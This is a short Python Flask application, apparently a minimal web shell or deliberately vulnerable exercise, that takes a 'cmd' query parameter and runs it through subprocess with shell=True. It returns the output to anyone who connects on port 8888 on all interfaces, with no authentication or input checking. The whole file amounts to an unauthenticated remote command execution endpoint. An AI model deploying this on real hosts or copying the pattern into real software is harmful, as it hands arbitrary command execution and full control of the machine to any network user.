from flask import Flask, request
import secrets
import subprocess


app = Flask(__name__)

@app.route('/', methods = ['GET'])
def index():
    if len(request.args) == 0:
        return 'Send a request with cmd parameter'
    else:
        cmd = request.args['cmd']
        try:
            return subprocess.check_output(cmd, shell=True)
        except:
            return 'An error occurred while processing the request.'

if __name__ == '__main__':
    app.run('0.0.0.0', port=8888)